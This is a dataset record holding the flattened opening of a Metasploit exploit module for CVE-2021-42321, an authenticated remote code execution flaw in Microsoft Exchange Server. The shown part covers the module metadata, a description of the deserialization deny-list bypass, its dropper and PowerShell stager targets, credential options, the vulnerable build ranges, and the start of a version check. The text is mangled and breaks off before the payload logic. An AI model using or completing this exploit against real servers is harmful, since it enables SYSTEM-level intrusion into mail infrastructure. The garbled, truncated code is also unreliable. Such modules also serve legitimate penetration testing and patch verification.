{
    "text": "vul_name : Microsoft Exchange Server Remote Code Execution ， vul_cve : CVE-2021-42321 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'nokogiri' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， include Msf : Exploit : Powershell ， super (  ， update_info (  ， info ,  ， 'Name' => 'Microsoft Exchange Server ChainedSerializationBinder Deny List Typo RCE' ,  ， 'Description' => %q{ ， This vulnerability allows remote attackers to execute arbitrary code ， on Exchange Server 2019 CU10 prior to Security Update 3 , Exchange Server 2019 CU11 ， prior to Security Update 2 , Exchange Server 2016 CU21 prior to ， Security Update 3 , and Exchange Server 2016 CU22 prior to ， Security Update 2. ， Note that authentication is required to exploit this vulnerability. ， The specific flaw exists due to the fact that the deny list for the ， ChainedSerializationBinder had a typo whereby an entry was typo'd as ， System.Security.ClaimsPrincipal instead of the proper value of ， System.Security.Claims.ClaimsPrincipal. ， By leveraging this vulnerability , attacks can bypass the ， ChainedSerializationBinder's deserialization deny list ， and execute code as NT AUTHORITY\\SYSTEM. ， Tested against Exchange Server 2019 CU11 SU0 on Windows Server 2019 ,  ， and Exchange Server 2016 CU22 SU0 on Windows Server 2016. ， } ,  ， 'Author' => [  ， 'pwnforsp' ,  # Original Bug Discovery ， 'zcgonvh' ,  # Of 360 noah lab , Original Bug Discovery ， 'Microsoft Threat Intelligence Center' ,  # Discovery of exploitation in the wild ， 'Microsoft Security Response Center' ,  # Discovery of exploitation in the wild ， 'peterjson' ,  # Writeup ， 'testanull' ,  # PoC Exploit ， 'Grant Willcox' ,  # Aka tekwizz123. That guy in the back who took the hard work of all the people above and wrote this module : D ，  ]  ,  ， ' ，  [ 'CVE' , '2021-42321' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => '2021-12-09' ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => 'win' ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Privileged' => true ,  ， 'Targets' => [  ，  [  ， 'Windows Command' ,  ， { ， 'Arch' => ARCH_CMD ,  ， 'Type' => : win_cmd ， } ，  ]  ,  ，  [  ， 'Windows Dropper' ,  ， { ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : win_dropper ,  ， 'DefaultOptions' => { ， 'CMDSTAGER : FLAVOR' => : psh_invokewebrequest ， } ， } ，  ]  ,  ，  [  ， 'PowerShell Stager' ,  ， { ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : psh_stager ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { ， 'SSL' => true ,  ， 'HttpClientTimeout' => 5 ,  ， 'WfsDelay' => 10 ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [  ， IOC_IN_LOGS ,  # Can easily log using advice at ， CONFIG_CHANGES # Alters the user configuration on the Inbox folder to get the payload to trigger. ，  ]  ， } ， register_options (  [  ， Opt : RPORT ( 443 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/' ]  )  ,  ， OptString.new ( 'HttpUsername' ,  [ true , 'The username to log into the Exchange server as' , ' ]  )  ,  ， OptString.new ( 'HttpPassword' ,  [ true , 'The password to use to authenticate to the Exchange server' , ' ]  )  ，  ]  )  ， end ， def post_auth? ， true ， end ， def username ， datastore [ 'HttpUsername' ]  ， end ， def password ， datastore [ 'HttpPassword' ]  ， end ， def vuln_builds ，  [  ，  [ Rex : Version.new ( '15.1.2308.8' )  , Rex : Version.new ( '15.1.2308.20' )  ]  ,  # Exchange Server 2016 CU21 ，  [ Rex : Version.new ( '15.1.2375.7' )  , Rex : Version.new ( '15.1.2375.17' )  ]  ,  # Exchange Server 2016 CU22 ，  [ Rex : Version.new ( '15.2.922.7' )  , Rex : Version.new ( '15.2.922.19' )  ]  ,  # Exchange Server 2019 CU10 ，  [ Rex : Version.new ( '15.2.986.5' )  , Rex : Version.new ( '15.2.986.14' )  ]  # Exchange Server 2019 CU11 ，  ]  ， end ， def check ，  # First lets try a cheap way of doing this via a leak of the X-OWA-Version header. ，  # If we get this we know the version number for sure and we can skip a lot of leg work. ， res = send_request_cgi (  ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path , '/owa/service' )  ， unless res",
    "time": "2022.03.01"
}